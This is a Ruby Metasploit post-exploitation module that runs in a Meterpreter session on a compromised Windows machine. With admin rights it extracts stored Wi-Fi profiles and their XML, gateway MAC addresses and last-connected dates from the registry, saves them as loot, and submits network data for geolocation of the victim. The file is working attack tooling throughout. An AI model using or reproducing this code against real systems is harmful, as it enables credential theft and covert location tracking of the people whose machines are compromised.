require 'msf/core'
require 'msf/core/post/windows/priv'
require 'rex'
require 'rex/proto/http/client'

class MetasploitModule < Msf::Post
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Badger_Report
	include Msf::Post::Windows::Priv

	def initialize(info={})
		super( update_info( info,
			'Name'          => 'WLAN Preferred Networks Triangulate',
			'Description'   => %q{
			This module extracts the Windows Preferred Networks to find geolocation data.
			},
			'License'       => MSF_LICENSE,
			'Author'        => [
				'v10l3nt',
				'TheLightCosine' # Based on wlan_profile module structure
						],
			'Version'       => '$Revision$',
			'Platform'      => [ 'windows'],
			'SessionTypes'  => [ 'meterpreter']
			))
		end

	def run

	# Requires Admin Credentials to Access Registry Key
	if not (is_admin?)
		print_error("This module requries admin privileges. Exiting")
		return
	end

		#Opens memory access into the host process
		mypid = client.sys.process.getpid
		@host_process = client.sys.process.open(mypid, PROCESS_ALL_ACCESS)
		@wlanapi = client.railgun.wlanapi
		wlan_info = "Wireless LAN Profile Information \n"
		wlan_handle = open_handle()
		unless wlan_handle
			print_error("Couldn't open WlanAPI Handle. WLAN API may not be installed on target")
			print_error("On Windows XP this could also mean the Wireless Zero Configuration Service is turned off")
			return
		end
		wlan_iflist = enum_interfaces(wlan_handle)

		#Take each enumerated interface and gets the profile information available on each one
		wlan_iflist.each do |interface|
			wlan_profiles = enum_profiles(wlan_handle, interface['guid'])
			guid = guid_to_string(interface['guid'])

			#Store all the information to be saved as loot
			wlan_info << "GUID: #{guid} Description: #{interface['description']} State: #{interface['state']}\n"
			wlan_profiles.each do |profile|
			profile['ssid'] = profile['name'].gsub("\000","")
			profile['bssid'] = ssid_to_bssid(profile['ssid']).gsub("0000","")
			profile['date']= last_Connect(profile['ssid'])
			print_status("Found Net: #{profile['ssid']}, #{profile['bssid']}, Connected Last: #{profile['date']}")
			survey = "&wifi=mac:#{profile['bssid']}%7Cssid:#{profile['ssid']}%7Css:-100"
			pos = wlan_triangulate(survey)            
			comment = "Net: #{profile['ssid']}, #{profile['bssid']}, Connected Last: #{profile['date']} @ Host: #{session.session_host}"
			report_results(pos,"msf_preferrednets",comment)                
			wlan_info << " Profile Name: #{profile['name']}\n"
			wlan_info  << profile['xml']
			end
		end
		#strip the nullbytes out of the text for safe outputting to loot
		wlan_info.gsub!(/\x00/,"")
		#print_good(wlan_info)
		store_loot("host.windows.wlan.profiles", "text/plain", session, wlan_info, "wlan_profiles.txt", "Wireless LAN Profiles")

		#close the Wlan API Handle
		closehandle = @wlanapi.WlanCloseHandle(wlan_handle,nil)
		if closehandle['return'] == 0
			print_status("WlanAPI Handle Closed Successfully")
		else
			print_error("There was an error closing the Handle")
		end
	end


	def open_handle
		begin
			wlhandle = @wlanapi.WlanOpenHandle(2,nil,4,4)
		rescue
			return nil
		end
		return wlhandle['phClientHandle']
	end


	def enum_interfaces(wlan_handle)
		iflist = @wlanapi.WlanEnumInterfaces(wlan_handle,nil,4)
		pointer= iflist['ppInterfaceList']
		numifs = @host_process.memory.read(pointer,4)
		numifs = numifs.unpack("V")[0]
		interfaces = []

		#Set the pointer ahead to the first element in the array
		pointer = (pointer + 8)
		(1..numifs).each do |i|
			interface = {}
			#Read the GUID (16 bytes)
			interface['guid'] = @host_process.memory.read(pointer,16)
			pointer = (pointer + 16)
			#Read the description(up to 512 bytes)
			interface['description'] = @host_process.memory.read(pointer,512)
			pointer = (pointer + 512)
			#Read the state of the interface (4 bytes)
			state = @host_process.memory.read(pointer,4)
			pointer = (pointer + 4)

			#Turn the state into human readable form
			state = state.unpack("V")[0]
			case state
				when 0
					interface['state'] = "The interface is not ready to operate."
				when 1
					interface['state'] = "The interface is connected to a network."
				when 2
					interface['state'] = "The interface is the first node in an ad hoc network. No peer has connected."
				when 3
					interface['state'] = "The interface is disconnecting from the current network."
				when 4
					interface['state'] = "The interface is not connected to any network."
				when 5
					interface['state'] = "The interface is attempting to associate with a network."
				when 6
					interface['state'] = "Auto configuration is discovering the settings for the network."
				when 7
					interface['state'] = "The interface is in the process of authenticating."
				else
					interface['state'] = "Unknown State"
			end
			interfaces << interface
		end
		return interfaces
	end


	def enum_profiles(wlan_handle,guid)
		profiles=[]
		proflist = @wlanapi.WlanGetProfileList(wlan_handle,guid,nil,4)
		ppointer = proflist['ppProfileList']
		numprofs = @host_process.memory.read(ppointer,4)
		numprofs = numprofs.unpack("V")[0]
		ppointer = (ppointer + 8)
		(1..numprofs).each do |j|
			profile={}
			#Read the profile name (up to 512 bytes)
			profile['name'] = @host_process.memory.read(ppointer,512)
			ppointer = (ppointer + 516)

			rprofile = @wlanapi.WlanGetProfile(wlan_handle,guid,profile['name'],nil,4,4,4)
			xpointer= rprofile['pstrProfileXML']

			#The size  of the XML string is unknown. If we read too far ahead we will cause it to break
			#So we start at 1000bytes and see if the end of the xml is present, if not we read ahead another 100 bytes
			readsz = 1000
			profmem = @host_process.memory.read(xpointer,readsz)
			until profmem[/(\x00){2}/]
				readsz = (readsz + 100)
				profmem = @host_process.memory.read(xpointer,readsz)
			end

			#Slice off any bytes we picked up after the string terminates
			profmem.slice!(profmem.index(/(\x00){2}/), (profmem.length - profmem.index(/(\x00){2}/)))
			profile['xml'] = profmem
			profiles << profile
		end
		return profiles
	end

	#Convert the GUID to human readable form
	def guid_to_string(guid)
		aguid = guid.unpack("H*")[0]
		sguid = "{" + aguid[6,2] + aguid[4,2] + aguid[2,2] + aguid[0,2]
		sguid << "-" + aguid[10,2] +  aguid[8,2] + "-" + aguid[14,2] + aguid[12,2] + "-" +  aguid[16,4]
		sguid << "-" + aguid[20,12] + "}"
		return sguid
	end

	def ssid_to_bssid(ssid)
		key = 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NetworkList\\Signatures\\Unmanaged'
		root_key, base_key = client.sys.registry.splitkey(key)
		open_key = client.sys.registry.open_key(root_key,base_key,KEY_READ)
		keys = open_key.enum_key
		vals = open_key.enum_value
		if (keys.length > 0)
			keys.each { |subkey|
			format = 'z50z20z1020c'
			keyint = key+"\\#{subkey}"
			root_key, base_key = client.sys.registry.splitkey(keyint)
			open_keyint =
			client.sys.registry.open_key(root_key,base_key,KEY_READ)
			valsint = open_keyint.enum_value
			v = open_keyint.query_value('Description')
			desc_key = v.data.to_s                
			if (desc_key.eql? ssid)
				mac_v = open_keyint.query_value('DefaultGatewayMac')
				bssid=reg_binary_to_mac(mac_v)
				return bssid
		end
		}
		else
			return 'error'
		end
	end

	# Convert a Reg Binary to A MAC Address
	def reg_binary_to_mac(mac_v)
		bssid = mac_v.data.to_s.unpack("H*")[0]
		bssid.insert(2,":")
		bssid.insert(5,":")
		bssid.insert(8,":")
		bssid.insert(11,":")
		bssid.insert(14,":")
		return bssid
	end

	# Convert Reg Binary To A Date
	def reg_binary_to_date(str)
		begin
		cut=str.scan(/..../)
		year=(cut[0][2,4]+cut[0][0,2]).hex.to_i
		month=(cut[1][2,4]+cut[1][0,2]).hex.to_i
		weekday=(cut[2][2,4]+cut[2][0,2]).hex.to_i
		date=(cut[3][2,4]+cut[3][0,2]).hex.to_i
		hour=(cut[4][2,4]+cut[4][0,2]).hex.to_i
		min=(cut[5][2,4]+cut[5][0,2]).hex.to_i
		if min < 10 then
			min="0#{min}"
		end
		t = Time.gm(year,month,date,hour,min)
		month = t.strftime("%B")
		weekday = t.strftime("%A")
		return "#{weekday}, #{date} #{month} #{year} #{hour}:#{min}"
		rescue
			return 'Error resolving last connected date'
		end
	end

	# Extract the DateLastConnected Key from the Matching Registry ProfileName
	def last_Connect(ssid)
		begin
		key = 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NetworkList\\Profiles'
		root_key, base_key = client.sys.registry.splitkey(key)
		open_key = client.sys.registry.open_key(root_key,base_key,KEY_READ)
		keys = open_key.enum_key
		vals = open_key.enum_value
		if (keys.length > 0)
		keys.each { |subkey|
			format = 'z50z20z1020c'
			keyint = key+"\\#{subkey}"
			root_key, base_key = client.sys.registry.splitkey(keyint)
			open_keyint =
			client.sys.registry.open_key(root_key,base_key,KEY_READ)
			valsint = open_keyint.enum_value
			v = open_keyint.query_value('ProfileName')
			prof_key = v.data.to_s                    
			if (prof_key.eql? ssid)
				conn_v = open_keyint.query_value('DateLastConnected')
				conn_date = conn_v.data.to_s.unpack("H*")[0]
				return reg_binary_to_date(conn_date)
			end
		}
		else
			return 'Error resolving last connected date'
		end
		rescue
			return 'Error resolving last connected date'
		end
	end

end
